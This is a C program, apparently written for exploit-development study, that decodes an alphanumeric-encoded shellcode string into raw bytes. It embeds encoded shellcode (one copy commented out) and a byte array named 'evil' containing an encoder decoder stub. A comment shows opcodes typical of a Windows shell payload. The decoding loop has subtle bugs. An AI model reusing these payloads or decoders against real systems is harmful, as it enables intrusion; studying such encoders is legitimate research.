#include <stdio.h> // printf(), fprintf(), stderr  
#include <stdlib.h> // exit(), EXIT_SUCCESS, EXIT_FAILURE, srand(), rand()  
#include <string.h> // strcasecmp(), strstr()  
//#include <sys/time.h> //struct timeval, struct timezone, gettimeofday()  



int main(int argc, char* argv[], char* envp[]) {

	printf("..................decode part.................");

	char* valid_chars;
	valid_chars = "0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

	//char* encoded_shell = "YlHharm0ipIpS0u9iUMaY0qTtKB0NPRkqBLLBkPRMDbksBlhlOwGMzmVNQkOTlmlQQqllBLlMPGQVoZmjaFgXbIbr2NwRk1BzpDKmzOLtKPLjqqhJCa8za8QPQtKaImPIqgctKMyZxk3MjniRkMddKM16vnQYoVLfaXOjm9quwP8Wp0ul6LCqm9hOKamNDCEGtnxBkOhMTKQVs2FtKLLPKdKNxKlYqZ3tKLDDKYqXPdIq4nDnDokqKS1pY1Jb1yoK0Oo1OQJbkZrHkrmaMbHLsLrYpkPBHRWrSlraO1DS8nlbWmVkW9oHUtxV0M1IpypKyi4Ntb0bHNIu00kypioIENpNpPP201020a0npS8xjLOGogpIoweF7PjkUS8Upw814n5PhLBipjqqLriXfqZlPr6b7ph3iteadqQKOweCUEpd4JlYopN9xbUHl0hzPWEVBR6yofu0j9pQZkTqFR7oxKRyIfhoo9oHUDKp63QZVpKqH0OnrbmlN2JmpoxM0N0ypKP0QRJipphpX6D0Sk5ioGeBmDX9pkQ9pM0r3R6pPBJKP0Vb3B738KRxYFh1OIoHU9qUsNIUv1ehnQKqIomr5Og4IYOgxLPkPM0yp0kS9RLplaUT22V2UBLD4RUqbs5LqMbOC1Np1gPdjkNUpBU9k1q8oypm19pM0NQyK9rmL9wsYersPK2LOjbklmF4JztkWDFjtmObhMDIwyn90SE7xMa7kKN7PYrmLywcZN4IwSVZtMOqxlTLGIrn4ko1zKdn7P0B5IppEmyBUjEaOUsAM0";
	char* encoded_shell = "KLK852M0M0M03059K50190344K20004K22LL4K22N44K42O8LO870JO601KO6LOL313LM2NLO0918OLMM197K2L222274K22N04K0JOL4K0LN148K318M1J1214K29O0M1J34K19N8K3OJ194K044KM1J601KO6L918OLMM19708K045L6M33ML8OK3MO445K4284K28O4M1J3364KLL0K4K28MLM1J34KM44KM1J05914O4O41K1K31291J21KOK01O1O1J4KN2JK4M1M380302M0M0384743021O24380L47O6M7KOJ58860M1M0M0O994242038O9502KM0KOJ5202020201020102038JJLO9OK0KOJ5672JM538907814N538M2M0N11L59K62JN026273869754431KOJ5559044LLKO0NM845JL38L0857226KOJ52JM02JM4262738M2J9981OKOJ54K0651L60K280O224MLN2J1038M0N0M0M0212JM038287423K5KOJ54M68M0M1M0M02326202JM026232738M2J9981OKOJ5M193O99645JN1K291M2527599OK8N0M0M0M02K392L2L354246452L444542350102031N01906JKN9045KK51JOM0M1M0M0019KM2MLM7599250K2LOM2MLN64JN4M756N4MO58N4M7KN9045K8019KKN90M2MLM74JN4M756N4MO58N4M7M2N4MO4JN4N70025M0151945K51O93M0A";
	//unsigned char* encoded_shell = "Ip";
	unsigned char evil[] = "\xda\xd1\xd9\x74\x24\xf4\x58\xba\x05\xf6\xdf\x74\x29\xc9\xb1";
	// <0xFC>[KL]<0xE8>[K8]<0x82>[52]<0x00>[M0]A
	//for (int i = 0; i < sizeof(evil)-1; i++){
		//printf("status = 0x%02X\n", (unsigned int)(evil[i] & 0xFF));
	//}
	printf("encoded shell size:%i", strlen(encoded_shell));
	int decoded_size = 0; 
	for (int j = 0;j < strlen(encoded_shell); j += 2) {

		
		unsigned char left = encoded_shell[j];
		unsigned char right = encoded_shell[j + 1];
		unsigned char D = NULL;
		unsigned char C = NULL;
		unsigned char E = NULL;
		unsigned char F = NULL;
		unsigned char B = NULL;
		unsigned char A = NULL;

		
		for (int i = 0; i < strlen(valid_chars); i++) {
			// check first condition
			unsigned char temp_D = valid_chars[i] & 0x0f;
			unsigned char temp_C = valid_chars[i] >> 4;
			if (left == (temp_C << 4) + temp_D) {
				D = temp_D;
				C = temp_C;
				//	printf("found first condition\n");
		
				//check second
				for (int k = 0; k < strlen(valid_chars); k++) {
					unsigned char temp_E = valid_chars[k] >> 4;
					unsigned char temp_F = (valid_chars[k] & 0x0f);
					if (right == (temp_E << 4) + temp_F) {
						//printf("found second condition\n");
						unsigned char temp_B = temp_F;
						// check third
						unsigned char shell = NULL;
						for (unsigned char input = 0x0; input <= 0xff; input++) {
							//printf("%c", input);
							shell = NULL;
							if ((temp_B == (input & 0x0f))) {
								unsigned char temp_A = (input & 0xf0) >> 4;
								if (temp_D == ((temp_A - temp_E) & 0x0f)) {
									A = temp_A;
									shell = input;
									decoded_size += 1;
									printf("0x%02X", (unsigned char)(shell & 0xFF));
									goto here;
								}

							}
						}


					}
				}

			}
		}


	here:
		printf("");
	}

	printf("decoded shell size:%i", decoded_size);
}